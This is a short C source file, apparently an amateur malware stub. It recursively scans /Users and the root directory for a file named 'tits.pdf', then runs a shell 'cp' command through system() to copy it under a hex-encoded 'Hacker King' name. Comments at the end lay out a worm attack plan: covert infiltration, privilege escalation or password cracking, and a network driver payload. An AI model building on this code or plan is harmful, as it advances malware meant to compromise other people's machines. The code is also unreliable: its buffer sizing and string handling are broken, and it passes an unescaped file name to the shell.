#include <unistd.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <stdlib.h>

void Scan(char* directory){

    char* item="tits.pdf";

    
    DIR *dp;
    if((dp = opendir(directory)) == NULL) {
        //fprintf(stderr,"cannot open directory: %s\n", directory);
        return;
    }
    struct dirent *entry;
    struct stat statbuf;
    
        chdir(directory);
         while((entry = readdir(dp)) != NULL) {




        lstat(entry->d_name,&statbuf);
        if(S_ISDIR(statbuf.st_mode)) {
             if(strcmp(".",entry->d_name) == 0 ||
                strcmp("..",entry->d_name) == 0)
                continue;

            Scan(entry->d_name);
        }

    if(strcmp(item,entry->d_name)==0){
        char* instruction= "cp ";
        char* instr2= " 4861636B6572204B606E67.";
        char* delim = ".";
        char* ptr= strtok(entry->d_name,delim);
        ptr= strtok(NULL,delim);
        char* buf2= malloc(sizeof(delim)+sizeof(entry->d_name)+sizeof(ptr));
        strcat(buf2,entry->d_name);
        strcat(buf2,delim);
        strcat(buf2,ptr);
        char* buf = malloc(sizeof(instruction)+ sizeof(buf2)+sizeof(instr2)+sizeof(ptr));
        strcat(buf,instruction);
        strcat(buf,buf2);
        strcat(buf,instr2);
        strcat(buf,ptr);
        system(buf);
        exit(0);
    }
         }
         chdir("..");
         closedir(dp);
}

int main(){

    Scan("/Users");
    Scan("/");

//reconstruction into exectuable file, from image to exe
//learn about the macho-o binary file format, used for most apple products
//use the network devices ,to make your worm function , use assembly to get the job done
//attack plan: 1) infiltrate target system, covertly run code
//2) shell script privlegae elevation or password hack, and enable the driver
//3) network driver payload

    return 0;
}